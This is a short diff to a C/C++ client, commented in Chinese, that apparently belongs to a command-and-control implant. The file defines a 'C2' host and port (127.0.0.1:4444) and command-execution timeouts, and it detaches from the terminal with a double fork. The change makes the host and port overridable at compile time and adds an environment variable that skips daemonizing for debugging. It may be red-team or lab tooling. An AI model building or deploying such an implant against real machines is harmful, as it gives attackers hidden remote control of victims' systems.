@@ -31,11 +31,15 @@
 #include <exception>
 #include <string>
 
-/* ---------- 配置(默认与 client_py/client.py 一致)---------- */
+/* ---------- 配置(默认与 client_py/client.py 一致)----------
+ * HOST / PORT 都用 #ifndef 包围,允许编译时 -DHOST='"..."' -DPORT=xxxx 覆盖。
+ */
 #ifndef HOST
 #define HOST          "127.0.0.1"   /* C2 地址 */
 #endif
+#ifndef PORT
 #define PORT          4444          /* C2 端口 */
+#endif
 #define BUFSIZE       4096          /* 与 server 端 recv 缓冲一致 */
 #define RECV_TIMEOUT  30            /* 收发 socket 超时(秒) */
 #define CMD_TIMEOUT   60            /* 单条命令执行超时(秒) */
@@ -128,6 +132,9 @@ static void ignore_signals(void) {
 
 /* ---------- double-fork daemonize,脱离终端 ---------- */
 static void daemonize(void) {
+    /* 调试用:设 CLIENT_FOREGROUND=1 跳过 daemonize,前台运行方便观察 */
+    if (getenv("CLIENT_FOREGROUND") != NULL) return;
+
     pid_t pid = fork();
     if (pid < 0) _exit(1);
     if (pid > 0) _exit(0);                 /* 第一次 fork:父进程退出 */
